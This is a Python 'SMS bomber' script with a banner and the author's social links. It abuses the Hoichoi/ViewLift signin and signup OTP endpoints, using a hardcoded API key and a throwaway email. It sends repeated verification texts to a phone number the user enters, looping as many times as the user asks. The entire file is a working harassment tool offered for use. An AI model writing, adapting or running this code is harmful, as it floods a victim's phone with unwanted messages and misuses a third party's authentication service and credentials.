import requests as rq

import os
os.system("clear")

print("""

  _______ __  __   ____   ____  __  __ ____  ______ _____  

 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 

    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |

    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 

    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 

    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\

                                                           

                                                           

""")
print ("		")


print ("Facebook.com/tasrif.hossen.shuvo")

print ("Youtube.com/tasrifmultimedia")

print ("github.com/ShTasrif")

print ("	")

"""

SMS Bomber using Hoichoi SMS api
"""

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input("[*] Enter Target Number: ")
  amount = int(input("[*] Enter Amount: "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"[ID: {i}] SMS Sent ✅")
        sent += 1
        nsent -= 1
      else:
        print(f"[ID: {i}] SMS Not Sent❌")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Target: {amount}\n[+] Sent✅: {sent}\n[-] Not Sent ❌: {nsent}")

if __name__ == "__main__":
  main()
